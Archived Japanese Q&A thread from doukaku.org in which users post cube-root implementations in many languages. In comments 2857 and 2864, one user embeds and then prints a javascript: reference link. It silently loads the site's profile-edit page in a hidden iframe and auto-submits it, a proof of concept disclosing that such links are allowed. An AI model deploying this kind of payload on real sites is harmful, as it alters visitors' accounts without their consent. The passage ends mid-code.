---
:id: '55'
:title: 立方根の計算
:comments:
- :id: '3411'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/3411
  :user_name: にしお
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/1/
  :language: 
  :time: 2007/09/01 16:17 GMT
  :vote_count: '1'
  :vote_score: '1'
  :body: "\r\n\t  xは0以上1000未満の実数です。\r\ny * y * y = xになるような実数y(立方根)を小数点以下12桁以上の正確さで\r\n求める関数cube_rootを作って下さい。\r\n<p>\r\nただし、このお題の趣旨は実数区間での探索なので、\r\n立方根関数があっても使ってはいけません。\r\n指数関数と対数関数も禁止します。\r\n</p>\n<p>\r\nPythonで表現した入出力の例：\r\n</p>\n<pre>\r\n&gt;&gt;&gt;
    cube_root(10.0)\r\n2.1544346900318834\r\n&gt;&gt;&gt; _ ** 3\r\n9.9999999999999947\r\n&gt;&gt;&gt;
    cube_root(100.0)\r\n4.6415888336127793\r\n&gt;&gt;&gt; _ ** 3\r\n100.00000000000003\r\n</pre>\r\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2770'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2770
  :user_name: naoya_t
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/348/
  :language: awk
  :time: 2007/09/01 16:57 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">% awk -f cuberoot.awk\r\n8.0\r\n2.0000000000000000\r\n10.0\r\n2.1544346900318931\r\n100.0\r\n4.6415888336127793</pre>\n\t"
  :code: "{\n\tprintf(\"%.16f\\n\", cube_root($1))\n}\n\nfunction cube_root(r,  a,b,d)\n{\n\ta
    = r\n\twhile (1) {\n\t\tb = (r / (a*a) + 2 * a) / 3\n\t\td = b - a ; if (d &lt;
    0) d = -d\n\t\tif (d &lt; 5e-13) break\n\t\ta = b\n\t}\n\treturn a\n}\n"
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2772'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2772
  :user_name: naoya_t
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/348/
  :language: awk
  :time: 2007/09/01 17:12 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">xが0の時にdivide by zeroになってしまいますね・・・修正します</pre>\n\t"
  :code: "{\n\tprintf(\"%.16f\\n\", cube_root($1))\n}\n\nfunction cube_root(r,  a,b,d)\n{\n\tif
    (r == 0) return 0 ##oops\n\n\ta = r\n\twhile (1) {\n\t\tb = (r / (a*a) + 2 * a)
    / 3\n\t\td = b - a ; if (d &lt; 0) d = -d\n\t\tif (d &lt; 5e-13) break\n\t\ta
    = b\n\t}\n\t\n\treturn a\n}\n"
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2773'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2773
  :user_name: hamano
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/25/
  :language: C
  :time: 2007/09/01 17:30 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">% ./cube_root 10\r\n2.1544346900318895\r\n\r\n%
    ./cube_root 100\r\n4.6415888336127781</pre>\n\t"
  :code: |
    #include &lt;stdio.h&gt;
    #include &lt;stdlib.h&gt;

    long double cube_root(long double x, long double min, long double max){
        long double m = (min + max) / 2;
        long double d = m * m * m - x;
        if(d &gt; -1E-13 &amp;&amp; d &lt; 1E-13) return m;
        if(d &gt; 0)
            return cube_root(x, min, m);
        else
            return cube_root(x, m, max);
    }

    int main(int argc, char *argv[])
    {
        long double x, y;
        if(argc &lt; 2) return EXIT_FAILURE;
        sscanf(argv[1], "%llf", &amp;x);
        y = cube_root(x, 0, 1000);
        printf("%.16llf\n", y);
        return EXIT_SUCCESS;
    }
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2775'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2775
  :user_name: tea
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/402/
  :language: Python
  :time: 2007/09/01 18:03 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">print文でフォーマット表示した時は、少し違う出力になるけど、\r\ndoctestはパスしました。</pre>\n\t"
  :code: |
    def cube_root(num, guess=1.0):
      """
      &gt;&gt;&gt; cube_root(10.0)
      2.1544346900318838
      &gt;&gt;&gt; _ ** 3
      10.000000000000002
      &gt;&gt;&gt; cube_root(100.0)
      4.6415888336127793
      &gt;&gt;&gt; _ ** 3
      100.00000000000003
      """
      improve = lambda x: ((x*2)+(num/x**2)) / 3.0
      good_enough = lambda x: abs(x**3-num) &lt; 0.00000000001

      while True:
        if good_enough(guess):
          return guess
        guess = improve(guess)
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2777'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2777
  :user_name: yuin
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/82/
  :language: Scala
  :time: 2007/09/01 18:58 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">まんまSICPですが。</pre>\n\t"
  :code: |
    def cube_root(x:double):double = {
      def improve(y:double)= ((y*2)+(x/Math.pow(y,2.0)))/3.0
      def good_enough(y:double) = (Math.pow(y,3.0)-x).abs &lt; 1e-13
      var guess = 1.0
      while(true) {
        if(good_enough(guess)) return guess
        guess = improve(guess)
      }
      guess
    }
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2778'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2778
  :user_name: nobsun
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/98/
  :language: Scheme
  :time: 2007/09/01 22:26 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">SICPそのまんま(exercise 1.8)\r\nただし、exercise 1.7
    を考慮しているので\r\n1.0e-30のような小さい数でも対応できる</pre>\n\t"
  :code: "(define (cubic-root-iter old-guess new-guess x)\n  (if (cubic-good-enough?
    old-guess new-guess)\n      new-guess\n      (cubic-root-iter new-guess (cubic-improve
    new-guess x) x)))\n\n(define (cubic-improve guess x)\n  (+ (/ x (* 3 (square guess)))
    (/ (* 2 guess) 3)))\n\n(define (cubic-good-enough? old-guess new-guess)\n  (&lt;
    (abs (- (/ old-guess new-guess) 1.0)) 1.0e-12))\n\n(define (cubic-root x)\n  (cubic-root-iter
    1.0 x x))\n\n(define (square x) (* x x))\n(define (cube x) (* x x x))\n\n#|\ngosh&gt;
    (cube (cubic-root 10.0))\n10.000000000000002\ngosh&gt; (cube (cubic-root 100.0))\n100.00000000000003\ngosh&gt;
    (cube (cubic-root 1000.0))\n1000.0\ngosh&gt; (cube (cubic-root 1.0e-30))\n1.0000000000000006e-30\ngosh&gt;
    (cube (cubic-root 1.0e-60))\n9.999999999999998e-61\ngosh&gt; \n|#\n"
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2779'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2779
  :user_name: nobsun
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/98/
  :language: Haskell
  :time: 2007/09/01 22:46 GMT
  :vote_count: '1'
  :vote_score: '1'
  :body: "\n\t  <pre class=\"compact\">そのままHaskellで\r\n</pre>\n\t"
  :code: "cbrt :: Double -&gt; Double -&gt; Double\ncbrt e x = iter 1.0 x x\n  where
    iter old new x\n           | good old new = new\n           | otherwise    = iter
    new (improve new x) x\n        improve g x  = (x / g^2 + 2 * g) / 3\n        good
    old new = abs (1 - old / new) &lt; e\n\ncubicRoot :: Double -&gt; Double\ncubicRoot
    = cbrt 1.0e-13\n\n{-\n*Main&gt; cubicRoot 1.0\n1.0\n*Main&gt; it ^ 3\n1.0\n*Main&gt;
    cubicRoot 10.0\n2.154434690031884\n*Main&gt; it ^ 3 \n10.000000000000002\n*Main&gt;
    cubicRoot 100  \n4.641588833612778\n*Main&gt; it ^ 3\n99.99999999999997\n*Main&gt;
    cubicRoot 1000\n10.0\n*Main&gt; it ^ 3\n1000.0\n*Main&gt; cubicRoot 1.0e-30\n1.0e-10\n*Main&gt;
    it ^ 3\n1.0e-30\n-}\n"
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2780'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2780
  :user_name: nobsun
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/98/
  :language: 
  :time: 2007/09/01 22:53 GMT
  :vote_count: '3'
  :vote_score: '3'
  :body: "\n\t  <pre class=\"compact\">SICPの当該箇所は\r\nhttp://mitpress.mit.edu/sicp/full-text/book/book-Z-H-10.html#%_thm_1.7\r\nhttp://mitpress.mit.edu/sicp/full-text/book/book-Z-H-10.html#%_thm_1.8\r\nです。</pre>\n\t"
  :code: ''
  :tags: []
  :references:
    :url: /web/20090411100033/http://mitpress.mit.edu/sicp/full-text/book/book.html
    :title: Structure and Interpretation of Computer Programs
- :id: '2781'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2781
  :user_name: nobsun
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/98/
  :language: 
  :time: 2007/09/01 23:03 GMT
  :vote_count: '1'
  :vote_score: '1'
  :body: "\n\t  <pre class=\"compact\">しまった g^2を使っちゃだめじゃん\r\n        improve g x  =
    (x / g^2 + 2 * g) / 3\r\nはキャンセルして\r\n        improve g x  = (x / (g * g) + 2 *
    g) / 3\r\nですね。\r\n</pre>\n\t"
  :code: ''
  :tags:
  - 訂正
  :references:
    :url: 
    :title: 
- :id: '2782'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2782
  :user_name: tea
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/402/
  :language: Python
  :time: 2007/09/02 02:13 GMT
  :vote_count: '1'
  :vote_score: '-1'
  :body: "\n\t  <pre class=\"compact\">手続き版は最初に投稿したので、\r\n\r\n・再帰\r\n・Yコンビネータ\r\n・アキュームレータ\r\n\r\nを使ったものを投稿します。\r\nアルゴリズムは全部同じ、Newton
    Raphson's method です。\r\n\r\n※ Yコンビネータは、one-linerなどの式中で再帰呼び出しをする方法。\r\n手続きなしでの実装は#2518に投稿しました。</pre>\n\t"
  :code: "def cube_root(x,y=1.0):\n  if abs(y**3-x) &lt; 1e-13:\n    return y\n  else:\n
    \   return cube_root(x, (((x/y**2)+(y*2)) / 3.0))\n\n\n\ndef cube_root(x):\n  def
    Y(f):\n    f_ = lambda v: f(f_,v)\n    return f_\n\n  good_enough = lambda y:
    abs(y**3-x) &lt; 1e-13\n  improve = lambda y: ((x/y**2)+(y*2)) / 3.0\n  return
    Y(lambda f,y: y if good_enough(y) else f(improve(y)))(1.0)\n\n\ndef cube_root(x):\n
    \ def accgen(func, n):\n    while True:\n      yield n \n      n = func(n)\n\n
    \ good_enough = lambda y: abs(y**3-x)&lt;1e-13\n  improve = lambda y: (((x/y**2)+(y*2))/3.0)\n
    \ return (y for y in accgen(improve,1.0) if good_enough(y)).next()\n"
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2783'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2783
  :user_name: 匿名
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/4/
  :language: Java
  :time: 2007/09/02 02:16 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">ニュートン法で求めてみました。</pre>\n\t"
  :code: |
    public class Sample {
        public static double cubicRoot(double a) {
            double x = 10;
            double x0;
            do {
                x0 = x;
                x = x - (x * x * x - a) / (3 * x * x);
            } while ((x - x0) != 0);
            return x;
        }

        public static void main(String[] args) {
            System.out.println(cubicRoot(10));
        }
    }
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2784'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2784
  :user_name: kozima
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/164/
  :language: Common
  :time: 2007/09/02 02:46 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">範囲を半分ずつ切っていく方針で。</pre>\n\t"
  :code: |
    (defun cuberoot (x)
      (let ((lb 0) (ub 10))
        (dotimes (i 50)
          (let ((m (/ (+ lb ub) 2)))
            (if (&lt; (* m m m) x)
                (setf lb m)
              (setf ub m))))
        (multiple-value-bind (q r)
            (truncate lb)
          (format t "~A.~A" q (floor r 1/1000000000000)))))
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2785'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2785
  :user_name: 匿名
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/4/
  :language: Python
  :time: 2007/09/02 03:01 GMT
  :vote_count: '1'
  :vote_score: '1'
  :body: "\n\t  <pre class=\"compact\">なんとか法とかよく知らないので、再帰クイックソート的に\r\n範囲を狭めてやってみました。\r\n</pre>\n\t"
  :code: |
    def cube_root(n):
      def f(a,b):
        if abs(n-(b**3)) &lt; 0.000000000001: return b
        if max(n, ((a+b)/2)**3) == n:
          return f((a+b)/2, b)
        else:
          return f(a, (a+b)/2)
      return f(0.0, float(n))

    i = cube_root(10)
    print '%.13f ** 3 = %.13f' % (i, i**3)
    i = cube_root(100)
    print '%.13f ** 3 = %.13f' % (i, i**3)
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2786'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2786
  :user_name: sumim
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/88/
  :language: Smalltalk
  :time: 2007/09/02 03:48 GMT
  :vote_count: '1'
  :vote_score: '1'
  :body: "\n\t  Squeak Smalltalk で。\n\t"
  :code: "| cubeRoot cr |\ncubeRoot := [:x |\n\t| y |\n\ty := 1.0.\n\t[((y*y*y) -
    x) abs &lt; 1e-13] whileFalse: [y := (x/y/y + (2*y)) / 3].\n\ty].\n\ncr := cubeRoot
    value: 10.\ncr asScaledDecimal: 16.  \"=&gt;  2.1544346900318838s16 \"\n(cr*cr*cr)
    asScaledDecimal: 16.   \"=&gt; 10.0000000000000017s16 \"\n\ncr := cubeRoot value:
    100.\ncr asScaledDecimal: 16.  \"=&gt; 4.6415888336127792s16 \"\n(cr*cr*cr) asScaledDecimal:
    16.  \"=&gt; 100.0000000000000284s16 \"\n"
  :tags:
  - Squeak_Smalltalk
  :references:
    :url: 
    :title: 
- :id: '2788'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2788
  :user_name: tea
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/402/
  :language: Python
  :time: 2007/09/02 05:42 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">Edu-sigメーリングリストのアーカイブより（参考リンク）\r\n\r\nHalley法です。高階関数にしてみました。</pre>\n\t"
  :code: "def gen_nth_root_func(nth, max_depth=-1, initial_guess=1.0, accuracy=1e-12):\n
    \ is_good_enough = lambda x,y: abs(y**nth-x) &lt; accuracy\n  improve = lambda
    x,y: ((nth+1)*x*y + (nth-1)*(y**(nth+1))) / ((nth-1)*x + (nth+1)*y**nth)\n\n  def
    nth_root(num, depth=max_depth, guess=initial_guess):\n    if num == 0:\n        return
    num\n    elif is_good_enough(num,guess) or depth == 0:\n        return guess\n
    \   else:\n        return nth_root(num, depth-1, improve(num,guess))\n  return
    nth_root\n\nsquare_root = gen_nth_root_func(nth=2) \ncube_root = gen_nth_root_func(nth=3,
    max_depth=-1, accuracy=1e-13)\n"
  :tags: []
  :references:
    :url: /web/20090411100033/http://mail.python.org/pipermail/edu-sig/2000-May/000435.html
    :title: '[Edu-sig] Halley''s Method for nth root of P'
- :id: '2789'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2789
  :user_name: にしお
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/1/
  :language: Python
  :time: 2007/09/02 06:25 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  \n<p>むむむ、平方根だと何かとかぶるかと思って立方根にしたのですが、それでもかぶってましたか…orz\n</p>\n<p>この問題は「線形に探索すると明らかに時間がかかりすぎるけども、二分探索なら十分な速度で答えが出る」というラインを狙って出題したので、下のようなアルゴリズムでも十分答えが出ます。\n</p>\n\n\n\n\t"
  :code: "def cube_root(x):\n\tc = 8.0\n\td = 4.0\n\tfor i in range(100):\n\t\tv =
    c * c * c\n\t\tif v &lt; x:\n\t\t\tc += d\n\t\t\td /= 2\n\t\telif v &gt; x:\n\t\t\tc
    -= d\n\t\t\td /= 2\n\t\telse:\n\t\t\tbreak\n\treturn c\n"
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2790'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2790
  :user_name: にしお
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/1/
  :language: 
  :time: 2007/09/02 06:30 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  \n<p>&gt;※ Yコンビネータは、one-linerなどの式中で再帰呼び出しをする方法。\n</p>\n<p>わわわ、四方八方から集中砲火を浴びそうな悪寒…\n</p>\n<p>#
    だが それがいい(ぇ\n</p>\n\n\n\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2791'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2791
  :user_name: tea
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/402/
  :language: 
  :time: 2007/09/02 07:42 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">あぁっ。べき乗もつかっちゃいけなかったんだ。\r\n指数とか対数ってexpとlogしか頭に無かったです。\r\nでも、禁止してるのは、cbrt
    = lambda x: x ** (1.0/3.0) \r\nの様な方法だと思うので、趣旨には反してないかな。。\r\n\r\n念のため、n ** m =&gt;
    pow(n,m)に読み替えてください。\r\n# ※ m=自然数のみ\r\npow = lambda n,m:reduce(lambda x,_: x*n,
    xrange(m), 1)\r\n</pre>\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2792'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2792
  :user_name: tea
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/402/
  :language: 
  :time: 2007/09/02 08:09 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">&gt;&gt;※ Yコンビネータは、one-linerなどの式中で再帰呼び出しをする方法。
    \r\n&gt; わわわ、四方八方から集中砲火を浴びそうな悪寒… \r\n\r\n利用法の１例であって、言い切ってしまったのはまずかったですね。誤解を与える説明でした。\r\n\r\nでも、一言で説明出来る自信ないので、please
    google 'Y-combinator' </pre>\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2793'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2793
  :user_name: ぱみ
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/420/
  :language: Ruby
  :time: 2007/09/02 09:52 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">SICPにあった区間二分法ほとんどそのまま。</pre>\n\t"
  :code: "def cube_root(n)\n  def close_enough?(x, y)\n    (x - y).abs &lt; 5.0E-13\n
    \ end\n\n  def search(f, negp, posp)\n    midp = (negp + posp) / 2\n    if(close_enough?(f.call(midp),
    0.0))\n      return midp\n    else\n      test_value = f.call(midp)\n      case\n
    \     when test_value &gt; 0\n        search(f, negp, midp)\n      when test_value
    &lt; 0\n        search(f, midp, posp)\n      else\n        midp\n      end\n    end\n
    \ end\n  \n  def half_interval_method(f, a, b)\n    a_value = f.call(a)\n    b_value
    = f.call(b)\n    case\n    when a_value &lt; 0 &amp;&amp; b_value &gt; 0\n      search(f,
    a, b)\n    when a_value &gt; 0 &amp;&amp; b_value &lt; 0\n      search(f, b, a)\n
    \   else\n      puts \"error\"\n      exit\n    end\n  end\n  \n  half_interval_method(lambda{|x|
    x*x*x - n}, -0.001, n+1)\nend\n\nputs \"%3.13f\" % cube_root(10.0) ** 3# 9.9999999999997\nputs
    \"%3.13f\" % cube_root(100.0) ** 3# =&gt; 99.9999999999999\n"
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2795'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2795
  :user_name: shg
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/383/
  :language: dc
  :time: 2007/09/02 14:03 GMT
  :vote_count: '1'
  :vote_score: '1'
  :body: "\n\t  \n<p>dcのマクロ。dcを起動して投稿のマクロを入力後、例えば以下のようにすると三乗根を計算する。\n</p>\n<pre><code>10
    lcxp\n</code></pre>\n<p>この問題では1000未満という条件があるので大丈夫だが、あまり大きい数を入れるとSegmentation faultで落ちる。自分を呼び出すことで繰り返しを実現しているので呼び出しが深くなることが問題と思われる。\n</p>\n\n\n\n\t"
  :code: |
    [_1*]ss[q]sq[d2*rd*lar/+3/ddd**la-d0&gt;sld&gt;qlrx]sr[13k.1d*dd*d**sddsa10/lrx]sc
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2796'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2796
  :user_name: matyr
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/343/
  :language: JavaScript
  :time: 2007/09/02 15:11 GMT
  :vote_count: '2'
  :vote_score: '2'
  :body: "\n\t   まず二分法で書いてみて，その後ニュートン法に替えたら簡潔さと速さに感動した。\n\t"
  :code: |
    function cube_root(x){
      for(var y = Number(x), z = 0; Math.abs(1 - z/y) &gt;= 1e-12; y = ((z = y)*2 + x/(y*y))/3);
      return y;
    }
  :tags: []
  :references:
    :url: javascript:(function(q,p)%7Bdo%7Bp=(function(x,y,z)%7Bfor(y=Number(x),z=0;Math.abs(1-z/y)&gt;=1e-12;y=((z=y)*2+x/(y*y))/3);return%20y%7D)(q)%7Dwhile(q=prompt('cube_root('+q+')%20=%20',p))%7D)(100)
    :title: デモ (キャンセルで終了)
- :id: '2797'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2797
  :user_name: shg
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/383/
  :language: 
  :time: 2007/09/02 15:28 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  \n<p>「0以上」の条件を見落していたので修正。\n</p>\n\n\n\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2798'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2798
  :user_name: shg
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/383/
  :language: dc
  :time: 2007/09/02 15:29 GMT
  :vote_count: '2'
  :vote_score: '2'
  :body: "\n\t  <pre class=\"compact\"></pre>\n\t"
  :code: |
    [_1*]ss[q]sq[d2*rd*lar/+3/ddd**la-d0&gt;sld&gt;qlrx]sr[14kd0=q.1ddd*d**d**sddsa10/lrx]sc
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2824'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2824
  :user_name: にしお
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/1/
  :language: 
  :time: 2007/09/03 02:41 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">おおお、デモが付いてるｗ\r\nJavaScriptならではですね！</pre>\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2825'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2825
  :user_name: にしお
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/1/
  :language: 
  :time: 2007/09/03 02:47 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">dcを言語一覧に追加しておきました。</pre>\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2835'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2835
  :user_name: r0c
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/396/
  :language: Python
  :time: 2007/09/03 04:07 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">ニュートン・ラプソン法で書いてみる．</pre>\n\t"
  :code: "def cube_root(x):\n  y = 0.0 \n  y_next = x \n  while y != y_next:\n    y
    = y_next\n    y_next = y - (y * y * y - x) / (3.0 * y * y)\n  return y\n"
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2836'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2836
  :user_name: ocean
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/177/
  :language: 
  :time: 2007/09/03 04:16 GMT
  :vote_count: '1'
  :vote_score: '1'
  :body: "\n\t  <pre class=\"compact\">試してみたのですが、cube_root(4.0) だと\r\n1.5874010519681996\r\nと\r\n1.5874010519681994\r\nで振動して、終了しませんね・・・</pre>\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2837'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2837
  :user_name: ocean
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/177/
  :language: 
  :time: 2007/09/03 04:17 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">ああ、すみません。振動する値というのは y です。</pre>\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2854'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2854
  :user_name: '[1..100]&gt;&gt;=pen'
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/304/
  :language: 
  :time: 2007/09/03 08:03 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">cubicRoot 0.0 が帰ってきません。\r\n0.0 / 0.0 ってエラーかと思ってたら
    NaN なんですね。\r\n\r\nそれと遅延評価ならではの数列生成と収束判定を分離した版もお願いします。</pre>\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2857'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2857
  :user_name: sawat
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/322/
  :language: 
  :time: 2007/09/03 08:20 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">というか、脆弱性ではないですか？\r\n参照リンクのクリックは自己責任？</pre>\n\t"
  :code: ''
  :tags: []
  :references:
    :url: javascript:(function(ifr,w)%7B(ifr=document.body.appendChild(document.createElement('iframe'))).name='hoge';ifr.style.display='none';ifr.src='/web/20090411100033/http://ja.doukaku.org/editprofile/';setTimeout(function()%7Bwith(window.frames%5B0%5D.document.forms%5B0%5D)%7Bid_desc.value+='%5Cn%E3%81%93%E3%82%93%E3%81%AB%E3%81%A1%E3%81%AF%E3%81%93%E3%82%93%E3%81%AB%E3%81%A1%E3%81%AF';submit();%7Dundefined%7D,%201000)%7D)();
    :title: こんにちはこんにちは
- :id: '2863'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2863
  :user_name: nobsun
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/98/
  :language: Haskell
  :time: 2007/09/03 09:05 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">0.0だけは別判定しないとだめですね。</pre>\n\t"
  :code: "starling f g x = f x (g x)\ncubicRoot 0 = 0\ncubicRoot x = snd . head .
    filter ((e &gt;) . abs . subtract 1 . uncurry (/)) \n            . starling zip
    tail . flip iterate 1 . improve $ x\n  where improve x g = (x / g^2 + 2 * g) /
    3\n         e = 1.0e-12\n"
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2864'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2864
  :user_name: sawat
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/322/
  :language: 
  :time: 2007/09/03 09:46 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  上の「こんにちはこんにちは」はIEじゃないと動かないぽいですね。余分な処理もあるし。直しませんけど。\r\n<br>ちなみにコードは以下の通り。\r\n<br><br>&gt; 管理者殿\r\n<br>問題がある場合はこのコメントごと削除して頂いて構いません。\r\n\r\n<pre>\r\njavascript:(\r\nfunction(ifr,w){\r\n
    \ (ifr=document.body.appendChild(document.createElement('iframe'))).name='hoge';\r\n
    \ ifr.style.display='none';ifr.src='http://ja.doukaku.org/editprofile/';\r\n  setTimeout(function(){\r\n
    \   with(window.frames[0].document.forms[0]){\r\n      id_desc.value+='\\nこんにちはこんにちは';\r\n
    \     submit();\r\n    }\r\n    undefined\r\n  }, 1000)\r\n})();\r\n</pre>\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2867'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2867
  :user_name: 130R
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/409/
  :language: 
  :time: 2007/09/03 11:06 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">踏んでしまいましたが、Operaでもこんにちわこんにちわされました。</pre>\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2868'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2868
  :user_name: r0c
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/396/
  :language: Python
  :time: 2007/09/03 11:07 GMT
  :vote_count: '2'
  :vote_score: '2'
  :body: "\n\t  \n<p>あ，ホントですね．\n</p>\n<pre><code>y != y_next\n</code></pre>\n<p>を収束条件にしてるせいみたいです．\n
    \  テストの手抜きがバレますね...\n</p>\n<p>もう少しまじめに収束判定した修正版を貼っておきます．\n   テストももう少しまじめにしておいたので大丈夫なはず..．\n</p>\n\n\n\n\t"
  :code: "def cube_root(x):\n  y = 0.0 \n  y_next = x \n  while abs(y - y_next) &gt;=
